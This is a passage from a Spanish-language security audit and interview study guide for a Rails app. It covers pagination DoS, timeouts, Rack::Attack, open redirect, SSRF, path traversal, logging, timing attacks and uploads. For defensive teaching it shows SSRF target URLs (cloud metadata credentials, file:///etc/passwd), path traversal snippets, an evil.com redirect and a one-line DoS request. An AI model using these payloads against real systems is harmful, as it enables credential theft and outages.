`start_with?` + `delete_prefix` son O(n) garantizado. Un regex "creativo" sobre
un header que controla el atacante es un vector clásico.

**Comparación:** la JVM tiene el mismo problema y **no** tiene un
`Regexp.timeout` global — tenés que envolver el `CharSequence` a mano o usar
RE2/J. En este punto puntual Rails 8 está mejor parado.

### 12.2 Payloads gigantes

Nada en Rails limita el tamaño del body por sí solo. El límite tiene que estar
**afuera**: `client_max_body_size` en nginx, o la variable de entorno
`MAX_REQUEST_BODY` en Thruster (que este repo usa: `gem "thruster"`,
`Gemfile:235`, versión 0.1.26). Ojo con el default de Thruster: es **`0`, o sea
sin límite** (`thruster-0.1.26/README.md:85`). No alcanza con tener Thruster
adelante; hay que setear la variable.

Adentro, lo que sí está acotado por defecto es el parseo de la query string.
`Rack::QueryParser` (Rack 3.2.7) trae tres techos, y los verifiqué en runtime:

| Límite | Valor acá | Qué corta |
|---|---|---|
| `param_depth_limit` | **32** | `?a[b][c][d]...` anidado; más profundo levanta `ParamsTooDeepError` |
| `params_limit` | **4096** | cantidad de parámetros en una misma query string |
| `bytesize_limit` | **4 MiB** | tamaño total de la query string |

(**Es 32, no 100.** El 100 circula en medio internet y sale de versiones viejas
de Rack; en la que corre acá el default está escrito literalmente en
`rack-3.2.7/lib/rack/utils.rb:35`: `QueryParser.make_default(32)`. Vale la pena
verificarlo en tu versión antes de citarlo en una entrevista.)

Aparte, `ActionDispatch::Request::Utils.perform_deep_munge` — activo acá — es
otra cosa distinta: no limita profundidad, elimina los `nil` de arrays y hashes
de `params` para que `?a[]=` no llegue como `[nil]` a un `where` y termine en un
`IS NULL` que no esperabas. Es una mitigación de inyección, no de DoS.

Y la validación de largo en los modelos es la última línea:
`app/models/product.rb:51` (`name`, máx 200), `app/models/user.rb`
(`name`, máx 120), `app/models/api_token.rb` (`name`, máx 80). Sin eso,
`description` (que es `text`, sin límite) acepta 50 MB. Nótese que
`Product#description` **no** tiene validación de largo: es un hueco real,
menor pero real.

### 12.3 Paginación sin límite — y el techo que este repo cree tener y no tiene

El clásico: `?limit=1000000` y el worker se muere cargando objetos.

`config/initializers/pagy.rb`:

```ruby
require "pagy/extras/overflow"
require "pagy/extras/headers"

Pagy::DEFAULT[:limit]     = 25
Pagy::DEFAULT[:max_limit] = 100      # ← "el que importa"… salvo que no hace nada
Pagy::DEFAULT[:overflow]  = :last_page
```

⚠️ **`max_limit` no es una opción de Pagy 9.4.0.** Es fácil de creer —el nombre
suena bien, el comentario del initializer suena convincente— pero fui a mirar la
gema y `grep -rn max_limit pagy-9.4.0/lib/` **no devuelve una sola línea**. La
opción real se llama `limit_max` (al revés), y sólo existe si cargás el extra
`limit`:

```ruby
# pagy-9.4.0/lib/pagy/extras/limit.rb
DEFAULT[:limit_param] = :limit
DEFAULT[:limit_max]   = 100
DEFAULT[:limit_extra] = true
```

Este initializer requiere `overflow` y `headers`, **no `limit`**. O sea que
`Pagy::DEFAULT[:max_limit] = 100` escribe una clave que nadie lee, y no hay techo.
Lo comprobé en runtime:

```ruby
Pagy::DEFAULT[:max_limit]   # => 100    ← la clave inventada, inerte
Pagy::DEFAULT[:limit_max]   # => nil    ← la clave real, sin setear
Pagy::Backend.ancestors.grep(/Limit/)   # => []   ← el extra no está cargado

pagy, records = pagy(Product.all, limit: "100000")
pagy.limit        # => 100000
records.to_sql    # => SELECT "products".* FROM "products" LIMIT 100000 OFFSET 0
```

El parámetro del usuario llega crudo al `LIMIT` del SQL. Y `paginate(scope)`
—`pagy(scope, limit: params[:limit])`, `app/controllers/api/v1/base_controller.rb:135`—
es exactamente el camino de seis endpoints de la API v1 (productos, stock items,
purchase orders, transfers, reservas, reportes). **`GET /api/v1/products?limit=1000000`
es hoy un DoS de una línea.** La UI web no está expuesta: todos sus `pagy` pasan
un literal (25 o 30).

El arreglo son dos líneas, y conviene poner las dos porque cubren capas distintas:

```ruby
# config/initializers/pagy.rb
require "pagy/extras/limit"      # ← sin esto, limit_max no existe
Pagy::DEFAULT[:limit_max] = 100
```

```ruby
# app/controllers/api/v1/base_controller.rb — no depender del initializer
def paginate(scope)
  pagy(scope, limit: params[:limit].presence&.to_i&.clamp(1, 100) || 25)
end
```

**La moraleja es más general que el bug:** una opción de configuración mal
escrita no falla, no avisa y no aparece en ningún test. Un `Hash` acepta
cualquier clave. Es el mismo modo de falla que el `NullStore` del rate limiter
(§5.3) y que la CSP en `nil` (§2.4): configuración que *parece* estar puesta.
Cuando un control de seguridad depende de una opción, el test no es "¿está la
línea en el initializer?" sino "¿pasa lo que tiene que pasar cuando pido el
abuso?".

`overflow: :last_page` sí funciona (el extra `overflow` está requerido) y cubre
`?page=99999`: en vez de un 500 o una página vacía rara, devuelve la última.

El ledger tiene su propio techo, `app/queries/stock_movements/ledger.rb`:

```ruby
DEFAULT_LIMIT = 50
MAX_LIMIT     = 200
# ...
@limit = limit.to_i.clamp(1, MAX_LIMIT)
```

`clamp(1, 200)` — no confía en el default de la gema y no depende de que alguien
no toque el initializer. **Defensa en profundidad en 12 caracteres**, y hoy es lo
único que salva a un endpoint de la API: `Api::V1::StockMovementsController#index`
le pasa `params[:limit] || 50` al query object, o sea el mismo parámetro crudo
que revienta a los otros seis, y el `clamp` lo corta en 200. Ese contraste es el
argumento entero a favor de validar en el borde de cada objeto en vez de confiar
en un initializer global.

### 12.4 Queries sin timeout

Sin `statement_timeout`, **una** query mala mantiene un thread de Puma ocupado
para siempre. Con 5 threads por worker, cinco de esas y el proceso no atiende
más nada.

`config/database.yml:52-55` (verificado contra el server en runtime):

```yaml
variables:
  statement_timeout: 15000                    # SHOW statement_timeout => 15s ✅
  lock_timeout: 10000                         # SHOW lock_timeout      => 10s ✅
  idle_in_transaction_session_timeout: 30000  # mata transacciones zombies
```

Los tres cubren fallas distintas:
- `statement_timeout` → query lenta
- `lock_timeout` → esperando un lock que no se libera
- `idle_in_transaction_session_timeout` → un `BEGIN` sin `COMMIT` (por un bug de
  la app o un debugger olvidado) que bloquea el `VACUUM` y hace crecer el WAL

Y `checkout_timeout: 5` (línea 44) del lado de Rails: cinco segundos esperando
una conexión libre del pool y después `ConnectionTimeoutError`. Fallar rápido y
liberar el thread es mejor que acumular requests colgadas.

**Dónde se rompe la analogía:** en Java, un `@Transactional(timeout = 15)` de
Spring aplica el timeout **del lado del cliente** (JDBC `Statement.setQueryTimeout`),
que manda un cancel. Acá `statement_timeout` es del lado del **servidor**
Postgres, que es más confiable: si el proceso Ruby muere, la query se mata igual.

### 12.5 Rack::Attack está montado dos veces (y por qué NO duplica los contadores)

Corriendo `bin/rails middleware` en este repo, `Rack::Attack` aparece **dos
veces** en el stack:

```text
use ActionDispatch::RemoteIp
use Rack::Attack                     ← el insert_after de config/application.rb
...
use Rack::TempfileReaper
use Rack::Attack                     ← el que agrega el railtie de la gema
use Bullet::Rack
```

La gema `rack-attack` inserta su middleware automáticamente vía railtie, y
`config/application.rb` lo vuelve a insertar después de `ActionDispatch::RemoteIp`
(con un motivo excelente, documentado ahí: sin eso `req.ip` sería la IP del
balanceador y todos los usuarios compartirían un contador).

**La conclusión intuitiva es que cada contador se incrementa dos veces y los
límites efectivos quedan a la mitad. Es falsa, y vale la pena saber por qué.**

`Rack::Attack#call` empieza con un guard de idempotencia
(`rack-attack-6.8.0/lib/rack/attack.rb:105`):

```ruby
def call(env)
  return @app.call(env) if !self.class.enabled || env["rack.attack.called"]

  env["rack.attack.called"] = true
  # ...
```

La primera instancia marca el `env`; la segunda lo ve marcado y pasa de largo
sin evaluar un solo safelist, blocklist o throttle. Es un no-op.

Lo medí contra un server real (puerto 3002, con `REDIS_URL` apuntando a una DB
de Redis vacía, leyendo los contadores con `redis-cli`):

```text
$ 3 GET /session/new  con X-Forwarded-For: 203.0.113.55
rack-attack:rack::attack:<ventana>:req/ip:203.0.113.55        = 3      ← no 6

$ 4 POST /session     con X-Forwarded-For: 198.51.100.7
rack-attack:rack::attack:<ventana>:req/ip:198.51.100.7        = 4      ← no 8
rack-attack:rack::attack:<ventana>:logins/ip:198.51.100.7     = 4
rack-attack:rack::attack:<ventana>:logins/email:nadie@x.com   = 4
```

Los límites son los que dicen ser. Lo único que cuesta el montaje doble es una
llamada de método por request y un lector desconcertado mirando
`bin/rails middleware`. Aun así conviene limpiarlo, porque la duplicación es
ruido y porque el día que alguien reordene el stack la intención tiene que estar
escrita:

```ruby
# config/application.rb
config.middleware.delete Rack::Attack
config.middleware.insert_after ActionDispatch::RemoteIp, Rack::Attack
```

**La lección que sí vale para la entrevista:** un middleware que se puede
insertar dos veces necesita ser idempotente, y rack-attack lo es a propósito.
Si escribís uno propio que incrementa contadores, cobra o escribe en la base,
poné el mismo guard — porque el auto-insert de un railtie más un
`insert_after` tuyo es una combinación normalísima.

---

## 13. Open redirect, SSRF y path traversal

### 13.1 Open redirect

El ataque: `https://tuapp.com/login?next=https://evil.com`. El usuario ve **tu**
dominio en el link, se loguea, y lo redirigís al sitio del atacante — que le
muestra un login idéntico. Es phishing con tu dominio como aval.

Este repo **no tiene ninguno**. Verifiqué todos los `redirect_to`/`redirect_back`:
todos van a helpers de ruta (`root_path`, `products_path`, `stock_item_path(@x)`)
o a un modelo (`redirect_to @warehouse`).

El único que toma algo "externo" es
`app/controllers/concerns/authentication.rb:32-39`:

```ruby
def request_authentication
  session[:return_to_after_authenticating] = request.url
  redirect_to new_session_path
end

def after_authentication_url
  session.delete(:return_to_after_authenticating) || root_url
end
```

Y es seguro **por construcción**: `request.url` es la URL que el propio server
recibió, no un parámetro. Un atacante no puede meter `https://evil.com` ahí
porque la sesión se escribe del lado del servidor con lo que la app ya sabe.

Si mañana alguien cambia eso por `params[:return_to]` (que es la forma en que
esto se implementa el 90% de las veces), el arreglo es validar:

```ruby
def safe_redirect_path(url)
  uri = URI.parse(url.to_s)
  # Sólo paths relativos. Sin host, sin esquema, y que no empiece con "//"
  # (que el browser interpreta como protocol-relative → dominio externo).
  return root_path if uri.host.present? || uri.scheme.present? || url.to_s.start_with?("//")
  uri.path.presence || root_path
rescue URI::InvalidURIError
  root_path
end
```

Rails también trae la red de seguridad del framework: `redirect_to` a otro host
desde un valor no literal levanta
`ActionController::Redirecting::UnsafeRedirectError` salvo que pases
`allow_other_host: true`.

**Ojo con el nombre de la opción, porque cambió.** La que se cita en todos lados
—`config.action_controller.raise_on_open_redirects`— está **deprecada en Rails
8.1**: sigue existiendo pero vale `false`, y el railtie de Action Controller
avisa si la seteás (`actionpack-8.1.3.1/lib/action_controller/railtie.rb:114-121`).
La que rige hoy es `action_on_open_redirect`, que `load_defaults 7.0` pone en
`:raise` (`railties-8.1.3.1/lib/rails/application/configuration.rb:266`).
Verificado en runtime de este repo:

```ruby
ActionController::Base.raise_on_open_redirects   # => false   (deprecada)
ActionController::Base.action_on_open_redirect   # => :raise  (la que aplica)
```

O sea: la protección está activa acá, pero si auditás una app buscando
`raise_on_open_redirects` y lo ves en `false`, no concluyas que está apagada.
Y en cualquier caso es una red, no un reemplazo de validar.

### 13.2 SSRF — el webhook del outbox

**Este es el vector de mayor riesgo de la app**, y hay que verlo bien.

`app/services/outbox/publisher.rb:20` y `:52`:

```ruby
"webhook" => -> { WebhookAdapter.new(url: ENV.fetch("OUTBOX_WEBHOOK_URL")) }

class WebhookAdapter
  def initialize(url:, secret: ENV["OUTBOX_WEBHOOK_SECRET"], timeout: 5)
    @uri = URI.parse(url)
    # ...
  end

  def publish(message)
    # ...
    response = Net::HTTP.start(@uri.hostname, @uri.port,
                               use_ssl: @uri.scheme == "https",
                               open_timeout: @timeout, read_timeout: @timeout) do |http|
      http.request(request)
    end
```

**Hoy es seguro**, y por un solo motivo: la URL viene de una **variable de
entorno**, no de la base ni de un request. Un atacante que no controla el
entorno no controla el destino.

El día que esto se vuelva "cada cliente configura su webhook desde el panel"
—que es la evolución natural y lo que pide todo el mundo— aparece SSRF de
manual. El atacante configura:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/                  # GCP
http://localhost:6379/                                               # tu Redis
http://10.0.0.5:5432/                                                # tu Postgres
file:///etc/passwd
```

...y tu servidor, que **sí** tiene acceso a la red interna, hace la request por
él. En 2019 esto fue el vector del breach de Capital One (100 millones de
registros).

Las defensas, en orden:

```ruby
def validate_webhook_url!(raw)
  uri = URI.parse(raw)

  # 1) Allow-list de esquema. Nada de file://, gopher://, ftp://.
  raise ArgumentError, "esquema no permitido" unless %w[https].include?(uri.scheme)

  # 2) Resolver el DNS UNA vez y validar la IP resuelta, no el hostname.
  #    Validar el hostname es inútil: "evil.com" puede resolver a 127.0.0.1.
  addrs = Resolv.getaddresses(uri.host).map { |a| IPAddr.new(a) }
  raise ArgumentError, "host no resuelve" if addrs.empty?

  blocked = [IPAddr.new("127.0.0.0/8"), IPAddr.new("10.0.0.0/8"),
             IPAddr.new("172.16.0.0/12"), IPAddr.new("192.168.0.0/16"),
             IPAddr.new("169.254.0.0/16"), IPAddr.new("::1/128"),
             IPAddr.new("fc00::/7")]
  if addrs.any? { |ip| blocked.any? { |net| net.include?(ip) } }
    raise ArgumentError, "destino en red privada"
  end

  # 3) Conectarse a la IP ya validada, NO al hostname.
  #    Si resolvés dos veces (una para validar, otra para conectar), hay una
  #    ventana de DNS REBINDING: el atacante devuelve una IP pública en la
  #    primera resolución y 169.254.169.254 en la segunda. Es TOCTOU sobre DNS.
  [uri, addrs.first]
end
```

Y las tres defensas **operativas**, que son más robustas que cualquier
validación en Ruby:

1. `Net::HTTP` sigue redirects sólo si vos se lo pedís (`Net::HTTP.start` +
   `request` no los sigue). Ese default es bueno: un 302 a `169.254.169.254` es
   el bypass más común de las allow-lists. **No** habilites `follow_redirects`.
2. **Egress proxy con allow-list**: todo el tráfico saliente sale por un proxy que
   sólo deja pasar destinos aprobados. Es la única defensa que no depende de que
   tu código sea perfecto.
3. **IMDSv2** en AWS (exige un PUT con token y respeta `X-Forwarded-For`), que
   mata el vector de credenciales.

Lo que este repo **sí** hace bien:
- `open_timeout: 5, read_timeout: 5` — sin eso, un endpoint que nunca responde
  te deja un worker de jobs colgado indefinidamente. Es DoS por webhook lento.
- Firma HMAC con timestamp (`publisher.rb:61-69`; el `sign` está en `:84`) contra replay. Eso protege al
  **receptor**, no a nosotros, pero es la mitad del contrato que casi nadie
  implementa.

### 13.3 Path traversal

Este repo **no lee ni escribe archivos con nombres que vengan del usuario**.
No hay `send_file`, `File.read` ni `render file:` con `params`. Superficie: cero.

Los peligros a conocer, para cuando aparezcan:

```ruby
send_file Rails.root.join("uploads", params[:name])   # ❌ ../../config/master.key
render file: params[:template]                        # ❌ + RCE vía ERB
File.read("/data/#{params[:id]}.csv")                 # ❌
```

La defensa es la misma siempre: **no construyas paths con input**. Buscá un
registro en la base por id, y sacá el path de ahí. Si no hay más remedio:

```ruby
base = Rails.root.join("uploads").realpath
path = base.join(File.basename(params[:name])).realpath   # basename mata los ".."
raise ArgumentError unless path.to_s.start_with?("#{base}/")
```

`File.basename` primero, `realpath` para resolver symlinks, y el chequeo de
prefijo al final. Los tres. `realpath` solo no alcanza (un symlink dentro de
`uploads/` que apunte afuera pasa el `start_with?` si lo hacés antes de
resolver).

Nota: Brakeman corre `SprocketsPathTraversal` y `Pathname`/`FileAccess` en su
set por defecto, y no reportó nada acá. Consistente con lo que se ve leyendo el
código.

---

## 14. Logs

### 14.1 Qué NUNCA loguear

- contraseñas, en cualquier forma (ni el hash — habilita un ataque offline)
- tokens de API, de sesión, de reset, JWTs, cookies
- números de tarjeta, CVV, cuentas bancarias
- datos personales: email, teléfono, dirección, documento (bajo GDPR, un log
  con PII es un sistema de tratamiento de datos con todo lo que eso implica)
- el body completo de requests de auth

El primer nivel de defensa es `filter_parameters` (§8.4). El segundo es la
disciplina: **nunca interpolar un objeto entero en un log**.

`config/environments/production.rb:80` cubre el error más común de todos:

```ruby
config.active_record.attributes_for_inspect = [ :id ]
```

Sin esa línea, un `Rails.logger.info("user: #{user.inspect}")` — o un error
report de Sentry que serializa el objeto — dumpea `password_digest`,
`email_address` y todo lo demás. Con ella, `user.inspect` devuelve
`#<User id: 1>`.

### 14.2 `request_id` para correlación

`config/environments/production.rb:37-38`:

```ruby
config.log_tags = [ :request_id ]
config.logger   = ActiveSupport::TaggedLogging.logger(STDOUT)
```

`ActionDispatch::RequestId` (está en el middleware stack, lo verifiqué con
`bin/rails middleware`) genera un UUID por request, o respeta el
`X-Request-Id` entrante si viene de un proxy de confianza. Todas las líneas de
log de esa request llevan el tag.

Ese id se propaga al contexto de la app:

```ruby
# app/controllers/application_controller.rb (set_current_request_context)
Current.request_id = request.request_id
Current.ip_address = request.remote_ip
Current.user_agent = request.user_agent
```

`Current` es `ActiveSupport::CurrentAttributes` — un singleton por thread/fiber
que **Rails resetea automáticamente** al final de cada request y de cada job.
Esa garantía de reset es lo que lo hace seguro, a diferencia de un `ThreadLocal`
a mano: en un pool de threads (Puma), si no limpiás, la request N+1 hereda los
datos de la N. Eso es **fuga de datos entre usuarios**, y es un bug de seguridad
real, no de higiene. El comentario de `app/models/current.rb` lo dice explícito.

Y el `request_id` es lo único que la API devuelve al cliente cuando algo
explota (`app/controllers/concerns/api/error_handling.rb:113-123`):

```ruby
Rails.logger.error(event: "api.internal_error", request_id: request.request_id,
                   exception: exception.class.name, message: exception.message,
                   backtrace: exception.backtrace&.first(15))
render_error(:internal_error, "Ocurrió un error inesperado. Contactá a soporte con este id.",
             status: :internal_server_error, request_id: request.request_id)
```

Soporte pide el id, lo busca en el log agregado, y ve el stack completo. El
cliente nunca ve un nombre de tabla ni un mensaje de Postgres.

`config/environments/production.rb:44` agrega
`config.silence_healthcheck_path = "/up"`: sin eso, el health check del
balanceador cada 5 segundos es el 80% del volumen de tu log y te tapa las
señales reales.

### 14.3 Qué SÍ loguear (eventos de seguridad)

`config/initializers/rack_attack.rb` (final del archivo) se suscribe al bus de
`ActiveSupport::Notifications` y loguea cada throttle/blocklist con la regla,
la IP, el path y el discriminador (truncado). Eso te da la base para alertar.

El repo también emite `event: "security.authorization_missing"`
(`app/controllers/api/v1/base_controller.rb:127`) cuando en producción una
acción se ejecutó sin `authorize`. Es la alerta de "hay un endpoint sin control
de acceso" sin tumbar el endpoint.

Lo que falta y hay que pedir en cualquier app real: log de **login exitoso**,
**login fallido**, **cambio de password**, **cambio de rol** y **emisión/revocación
de token**. Sin eso no hay forma de responder "¿desde cuándo entraron?" después
de un incidente.

---

## 15. Timing attacks y `secure_compare`

El `==` de String en Ruby (como en Java) hace short-circuit: compara byte a byte
y corta en la primera diferencia. Comparar un secreto con `==` filtra, en el
tiempo de respuesta, **cuántos bytes iniciales acertaste**. Con suficientes
muestras se recupera el secreto byte por byte.

```ruby
# ❌ filtra por timing
token == params[:token]

# ✅ tiempo constante (si son del mismo largo)
ActiveSupport::SecurityUtils.secure_compare(token, params[:token])

# ✅ tiempo constante SIN filtrar el largo (hashea los dos primero)
ActiveSupport::SecurityUtils.fixed_length_secure_compare(
  OpenSSL::Digest::SHA256.digest(a), OpenSSL::Digest::SHA256.digest(b)
)
```

`secure_compare` de ActiveSupport ya hace ese hasheo interno, así que tolera
largos distintos; `fixed_length_secure_compare` es el primitivo crudo y **exige**
largos iguales.

**La observación arquitectónica que vale más que la técnica:** este repo **no
compara secretos en Ruby en ningún lado**, y por eso no necesita
`secure_compare`.

`app/models/api_token.rb:52-60`:

```ruby
def digest(raw) = OpenSSL::Digest::SHA256.hexdigest(raw)

def authenticate(raw)
  return nil if raw.blank?
  active.find_by(token_digest: digest(raw))
end
```

Hasheamos el input y **buscamos por índice único** (`index_api_tokens_on_token_digest`,
`db/schema.rb:33`). Nunca hay una comparación de strings secretos en el proceso
Ruby. El B-tree de Postgres tiene su propio perfil de timing, pero opera sobre
el **hash**, no sobre el secreto: filtrar información del hash no te acerca al
token.

Lo mismo con la sesión: `cookies.signed` usa `MessageVerifier`, que internamente
compara la firma con `secure_compare`. Es el framework el que lo hace bien.

Dónde **sí** haría falta en este repo: si mañana agregamos el **receptor** del
webhook, la verificación de la firma HMAC entrante tiene que ser
`secure_compare`:

```ruby
expected = OpenSSL::HMAC.hexdigest("SHA256", secret, "#{timestamp}.#{body}")
unless ActiveSupport::SecurityUtils.secure_compare(expected, request.headers["X-Stock-Signature"])
  head :unauthorized and return
end
# Y además: rechazar si |now - timestamp| > 5 minutos (anti-replay).
```

Está anotado en `app/services/outbox/publisher.rb:83`.

**Nota de realismo para la entrevista:** un timing attack sobre HTTP con jitter
de red necesita decenas de miles de muestras. Es un ataque real pero de baja
probabilidad comparado con XSS o IDOR. La respuesta madura es: "usá
`secure_compare` porque es gratis, pero si tenés que priorizar, la enumeración
de usuarios por timing (§5.2, **~330× de diferencia**) es mucho más explotable
que un `==` sobre un token".

---

## 16. Uploads de archivos (Active Storage)

`active_storage/engine` está requerido en `config/application.rb` y el servicio
está configurado (`config.active_storage.service = :local` en dev y prod), pero
**este repo no tiene ni un `has_one_attached` ni un `has_many_attached`**
(lo verifiqué con grep sobre `app/`, `lib/` y `db/`). Superficie de ataque
actual: cero.

Como el día que agreguen "foto del producto" o "remito escaneado" van a
tropezar con lo mismo que todo el mundo, dejo los cuatro controles:

**1. Tipo de contenido — no confíes en lo que declara el cliente**

```ruby
class Product < ApplicationRecord
  has_one_attached :photo do |attachable|
    attachable.variant :thumb, resize_to_limit: [300, 300]
  end

  validate :photo_must_be_an_image

  private

  def photo_must_be_an_image
    return unless photo.attached?
    # ⚠️ photo.content_type sale del header del CLIENTE. Es un dato, no una
    # verificación. Marcel (la gema que usa Active Storage) puede inferirlo del
    # contenido real; para algo serio, `file --mime-type` sobre el blob.
    errors.add(:photo, "debe ser imagen") unless photo.content_type.in?(%w[image/png image/jpeg image/webp])
  end
end
```

**2. Tamaño — el límite tiene que estar antes de Rails**

`client_max_body_size` en nginx / Thruster. La validación en el modelo corre
**después** de que el archivo ya se subió entero al disco. Sirve para el mensaje
de error, no para la protección.

**3. Ejecución — el vector serio**

Si servís uploads desde tu propio dominio, un `.svg` con `<script>` adentro es
XSS **con tu origen** (y por lo tanto con acceso a las cookies no-httponly y a
las requests autenticadas). Un `.html` subido es peor.

- Servir desde un **dominio separado** (`uploads.tuapp.com`), sin cookies.
- `Content-Disposition: attachment` para todo lo que no sea imagen conocida.
  **Active Storage ya lo impone, y no al revés:** `Blob#forced_disposition_for_serving`
  devuelve `:attachment` para cualquier tipo que no esté en
  `ActiveStorage.content_types_allowed_inline` (hoy: webp, avif, png, gif, jpeg,
  tiff, bmp, psd y pdf — `activestorage-8.1.3.1/lib/active_storage/engine.rb:65`).
  Pedirle `disposition: :inline` a un `.svg` o a un `.html` **no** te lo sirve
  inline: el `forced_disposition` pisa lo que pediste. Y además esos tipos están
  en `content_types_to_serve_as_binary` (`engine.rb:53`), así que se sirven con
  content-type binario. Es una de las mejores defensas que Active Storage te da
  gratis, y conviene saber que no es opcional.
- `X-Content-Type-Options: nosniff` ya está (§9).
- Y **regenerar** las imágenes con `image_processing` (variantes): eso elimina
  metadata EXIF (que incluye geolocalización) y de paso destruye cualquier
  payload embebido.

**4. Path traversal en el nombre**

Active Storage guarda los blobs con una **clave aleatoria**, no con el nombre
original (`filename` es sólo metadata para el `Content-Disposition`). Eso te
protege gratis del `../../` en el nombre de archivo. Es una de las razones por
las que conviene usar Active Storage en vez de manejar `File.write` a mano.

Bonus: `ImageMagick`/`ImageProcessing` han tenido CVEs serios (ImageTragick).
`libvips` es más rápido y tiene mejor historial. Y en los dos casos, procesar
en un **job**, no en el request.

---

## Errores que ves en producción

| # | Síntoma | Causa | Arreglo |
|---|---|---|---|
| 1 | Una sesión de hace 3 meses sigue funcionando | `find_session_by_cookie` usa `Session.find_by`, no `Session.active.find_by` (`app/controllers/concerns/authentication.rb:29`). Verificado: una sesión con `expires_at` de hace 10 días sigue autenticando | `Session.active.find_by(id:)`. Y no dependas del job de las 4 AM para cerrar sesiones |
| 2 | Brakeman: "The application does not force use of HTTPS" | `config.force_ssl` comentado (`config/environments/production.rb:31`). Sin él: sin HSTS, sin redirect, y las cookies **sin `secure`** | `config.assume_ssl = true` + `config.force_ssl = true`. Sin `assume_ssl`, con proxy delante, entrás en loop de redirect |
| 3 | Cualquier XSS ejecuta scripts sin restricción | `config/initializers/content_security_policy.rb` entero comentado. `Rails.application.config.content_security_policy # => nil`, pese a que el layout emite `csp_meta_tag` | Definir la política, nonce con `SecureRandom.base64(16)` (**no** `session.id`), arrancar con `report_only` |
| 4 | El scanner enumera qué emails están registrados | Login con `find_by` + `authenticate`: **233 ms vs 0,7 ms** medidos acá. Dos órdenes de magnitud, visible desde internet | `User.authenticate_by` (ya usado en `sessions_controller.rb:17`). Mensaje de error idéntico en los dos casos |
| 5 | Un operador se autopromueve a admin | `permit(..., :role)` en un `user_params` que no discrimina quién pide | Allow-list condicional + `UserPolicy#change_role?` (`app/policies/user_policy.rb:12`) |
| 6 | Un endpoint nuevo quedó sin control de acceso 8 meses | Te olvidaste de `authorize`. Nadie avisa | `after_action :verify_authorized`. Está en el `BaseController` de la API (`base_controller.rb:117`) pero **falta en `ApplicationController`** |
| 7 | El listado muestra registros de otro tenant | Autorizaste el `show` pero el `index` usa `Model.all` | `policy_scope` + `verify_policy_scoped`. El `Scope` base devuelve `scope.none`: falla cerrado |
| 8 | `bin/rails middleware` muestra `Rack::Attack` **dos veces** y alguien concluye que los límites cortan a la mitad | El railtie de la gema lo auto-inserta y `config/application.rb:52` lo vuelve a insertar tras `RemoteIp`. **No duplica nada**: `Rack::Attack#call` corta con `env["rack.attack.called"]` (`rack-attack-6.8.0/lib/rack/attack.rb:105`) — medido contra un server real: 4 requests → contador 4 | Igual conviene limpiarlo: `config.middleware.delete Rack::Attack` antes del `insert_after`. Y si escribís un middleware propio que cuenta o cobra, ponele el mismo guard |
| 9 | El rate limit no limita nada y no hay error | `rate_limit` sobre un `NullStore`: `increment` devuelve `nil` y la comparación nunca se cumple | Elegir el store explícito y avisar si no sirve (`base_controller.rb:46-57`) |
| 10 | Dos `rate_limit` comparten contador; el de 20 corta en 11 | Sin `name:`, la clave es `["rate-limit", controller_path, nil, by]` para los dos | `name:` distinto en cada declaración |
| 11 | El worker se cuelga y no vuelve | Query sin `statement_timeout`, o webhook sin `read_timeout` | `statement_timeout`/`lock_timeout` en `database.yml:52`; `open_timeout`/`read_timeout` en `Net::HTTP.start` |
| 12 | `?limit=100000` tumba el proceso | Paginación sin techo. **Pasa hoy en la API de este repo**: `max_limit` no es una opción de Pagy 9.4.0 (la real es `limit_max`, y necesita `require "pagy/extras/limit"`), así que `paginate` manda el parámetro crudo al `LIMIT` | Cargar el extra `limit` y setear `limit_max`, **más** un `clamp` propio en el controller — como ya hace `ledger.rb` |
| 13 | Un `%` en el buscador dispara un Seq Scan de la tabla entera | `LIKE` sin `sanitize_sql_like` | `sanitize_sql_like` en todo input que llegue a `LIKE`/`ILIKE` (`supplier.rb:23`, `products/search.rb:59`) |
| 14 | El log tiene `password_digest` y emails de usuarios | `user.inspect` en un log o en el error report | `config.active_record.attributes_for_inspect = [:id]` + `filter_parameters` |
| 15 | El cliente ve `PG::UndefinedColumn: column products.foo does not exist` | Se devuelve `e.message` crudo en el 500 | Mensaje genérico + `request_id` (`error_handling.rb:113`) |
| 16 | Reset de contraseña: el atacante sigue adentro | No se revocan las sesiones al cambiar la clave | `@user.sessions.destroy_all` (ya está en `passwords_controller.rb:22`) |
| 17 | El webhook configurable lee las credenciales IAM del host | SSRF: URL de destino que controla el usuario | Allow-list de esquema + resolver DNS y validar la **IP**, conectar a esa IP, no seguir redirects, egress proxy, IMDSv2 |
| 18 | La suite tarda minutos hasheando passwords | `bcrypt` con cost 12 en tests. Rails ya baja el cost solo (`min_cost = Rails.env.test?`, `active_model/railtie.rb:18`), así que si te pasa es porque alguien lo pisó, o porque estás generando digests fuera de `RAILS_ENV=test` | No lo re-configures a mano: verificá `ActiveModel::SecurePassword.min_cost` en el entorno que corre la suite |

---

## Cómo responder esto en una entrevista

**1. "¿Rails te protege de SQL injection?"**

Parcialmente. `where(hash)` y `where("x = ?", v)` generan prepared statements con
binds. Lo que **no** protege: interpolación de strings en `where`, y
`order`/`group`/`select`/`pluck` con contenido del usuario. Desde Rails 6, para
pasar SQL crudo a `order`/`pluck` tenés que envolverlo en `Arel.sql` — que no
sanitiza nada, es una declaración explícita de responsabilidad. La regla que uso:
`Arel.sql` sólo recibe literales del código fuente; un `order` dinámico se
resuelve con un **hash de allow-list** (`SORTS` en
`app/queries/products/search.rb:25`), nunca pasando el parámetro. Y para
`LIKE`, `sanitize_sql_like` — que no es contra inyección de SQL sino contra
inyección de **comodines**, que es un DoS barato.

*Trade-off:* la allow-list es rígida (agregar un criterio de orden es un deploy).
La alternativa —validar el string contra un regex de columnas— es más flexible y
mucho más fácil de romper. Prefiero rígido.

**2. "Contame el ataque de enumeración de usuarios por timing."**

Si el login hace `find_by(email)` y después `authenticate`, un email inexistente
responde en milisegundos y uno existente paga el costo de bcrypt. Medí las dos
formas en la app en la que estuve trabajando: **233 ms vs 0,7 ms**, dos
órdenes de magnitud de diferencia. Eso es medible desde internet con jitter de red, y te deja enumerar
la base de usuarios sin adivinar una sola contraseña — que es el paso 1 de un
credential stuffing dirigido.

`User.authenticate_by` (Rails 7.1+) lo arregla: cuando no encuentra el usuario,
hace `new(passwords)`, que dispara el setter de `has_secure_password` y **quema
deliberadamente el mismo tiempo de bcrypt**. Medido con `authenticate_by`:
236 vs 235 ms, ~1% de diferencia.

*Trade-off:* no cierra el canal por completo (iguala bcrypt, no la query) y le
regala CPU al atacante en cada intento fallido. Por eso hace falta además rate
limiting en dos dimensiones — por IP contra el credential stuffing, y **por
